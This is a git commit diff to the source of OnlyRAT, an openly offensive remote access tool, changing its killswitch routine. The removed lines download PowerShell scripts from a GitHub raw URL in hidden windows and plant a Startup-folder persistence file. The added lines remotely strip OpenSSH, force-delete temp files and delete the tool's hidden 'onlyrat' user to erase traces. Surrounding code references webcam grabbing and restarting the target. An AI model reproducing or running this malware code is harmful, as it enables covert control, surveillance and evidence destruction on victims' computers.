7a382e5c0b2a27e17c00f7f2ed8acfd56abb23e4
Blue Cosmo <bluecosmo@localhost.localdomain>
2022-04-16 22:32:14 -0400

    test10

--- main.py
+++ main.py
@@ -232,19 +232,20 @@ def grab_webcam(address, password, working, username):
 def killswitch(address, password, working, username):
     print("\n[*] Prepping killswitch...")
     # web requests
-    killswitch_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/killswitch.ps1 -OutFile {working}/TOhjZsWluf.ps1\""
-    killtask_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/killtask.ps1 -OutFile {working}/SaReWIdGnz.ps1\""
-    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/SaReWIdGnz.ps1 >> GiLqXiexKP.cmd"
+    # killswitch_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/killswitch.ps1 -OutFile {working}/TOhjZsWluf.ps1\""
+    # killtask_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/killtask.ps1 -OutFile {working}/SaReWIdGnz.ps1\""
+    # controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/SaReWIdGnz.ps1 >> GiLqXiexKP.cmd"
+    killswitch_command = f"Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item \"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GiLqXiexKP.cmd\"; powershell /c Remove-Item $env:temp/* -r -Force; Remove-Item \"C:/Users/onlyrat\" -r -Force; Remove-LocalUser -Name \"onlyrat\""
     print("[+] Killswitch prepped")
 
     # installing killswitch
-    print("[*] Installing killswitch...")
+    print("[*] Executing killswitch...")
     remote_command(address, password, killswitch_command)
-    print("[*] Installing scheduler...")
-    remote_command(address, password, killtask_command)
-    print("[*] Installing controller...")
-    remote_command(address, password, controller_command)
-    print("[+] Killswitch installed sucessfully\n")
+    # print("[*] Installing scheduler...")
+    # remote_command(address, password, killtask_command)
+    # print("[*] Installing controller...")
+    # remote_command(address, password, controller_command)
+    print("[+] Killswitch Executed sucessfully\n")
        
     # execute logger
     print("\n[*] Restarting target computer...")
--- payloads/killswitch.ps1
+++ payloads/killswitch.ps1
@@ -1,5 +1,2 @@
-Remove-Item "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GiLqXiexKP.cmd"
-Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
-Remove-LocalUser -Name "onlyrat"
-Remove-Item "C:/Users/onlyrat"
-powershell /c Remove-Item $env:temp/* -r
+Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GiLqXiexKP.cmd"; powershell /c Remove-Item $env:temp/* -r -Force; Remove-Item "C:/Users/onlyrat" -r -Force; Remove-LocalUser -Name "onlyrat"
+
